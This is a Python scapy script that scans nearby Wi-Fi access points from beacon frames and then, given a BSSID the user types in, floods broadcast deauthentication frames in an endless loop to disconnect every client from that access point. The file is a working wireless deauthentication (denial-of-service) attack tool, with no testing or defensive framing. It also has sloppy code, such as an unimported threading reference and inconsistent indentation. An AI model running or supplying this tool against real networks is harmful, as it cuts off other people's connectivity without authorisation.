from scapy.all import *
from threading import Thread
import pandas
import time
import os
import random

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)
# interface = "wlan0mon"
def callback(packet):
	if packet.haslayer(Dot11Beacon):
		# extract the MAC address of the network
		bssid = packet[Dot11].addr2
		# get the name of it
		ssid = packet[Dot11Elt].info.decode()
		try:
			dbm_signal = packet.dBm_AntSignal
		except:
			dbm_signal = "N/A"
		# extract network stats
		stats = packet[Dot11Beacon].network_stats()
		# get the channel of the AP
		channel = stats.get("channel")
		# get the crypto
		crypto = stats.get("crypto")
		networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)



def disconnect(_ap, _st):
	print(_ap)
	pkt = RadioTap() / Dot11(addr1=_st, addr2=_ap, addr3=_ap) / Dot11Deauth(reason=2)
	while True:	
		# print("hell")
		sendp(pkt, iface=interface, verbose=False)

def findBSS(bssid_diconnect):
            print ("Disconnecting: %s" % bssid_diconnect)
            _t = threading.Thread(target=disconnect, args=(bssid_diconnect, "ff:ff:ff:ff:ff:ff"))
            _t.daemon = True
            _t.start()

def change_channel():
    ch = 1
    while True:
        #     try:
        ch = int(random.randint(1,13))
        os.system('iwconfig %s channel %d' % (interface, ch))
        # switch channel from 1 to 14 each 0.5s
        time.sleep(0.1)
        # global stop_threads
        # if stop_threads:
        #         break
        #     except KeyboardInterrupt:
        #             findBSS("ee:4b:9f:94:60:7c")

def print_all():
    # os.system("clear")
	# global stop_threads
	# if stop_threads:
	# 	pass
	while True:
		# try:
		global stop_threads
		if stop_threads:
			break
		os.system("clear")
		print(networks)
		time.sleep(0.2)

                # while True: time.sleep(3)
		# except KeyboardInterrupt:
		# 	break
		# 	# findBSS("bc:8a:e8:06:b7:d6")
			
#   print '\n! Received keyboard interrupt, quitting threads.\n'
        # except (KeyboardInterrupt, SystemExit):
        #         print("hello")
        #         findBSS("ee:4b:9f:94:60:7c")

if __name__ == "__main__":
	# interface name, check using iwconfig
	
	# interface = "wlan0mon"
	global interface
	interface  = input("Enter the monitor mode wifi interface name: ")
	# start the thread that prints all the networks
			# start the channel changer
	channel_changer = Thread(target=change_channel)
	channel_changer.daemon = True
	channel_changer.start()

	stop_threads = False

	printer = Thread(target=print_all)
	printer.daemon = True
	printer.start()

	# sniff(prn=callback, iface=interface)
	count = True
	while count:
			try:
				sniff(prn=callback, iface=interface)
				
				while True: time.sleep(3)
			except KeyboardInterrupt:
				# while True: time.sleep(1.0)
				stop_threads = True
				bssid = input("Enter the BSSID(or Mac) of AP to disconnect: ")
				findBSS(bssid)
				# stop_packet=True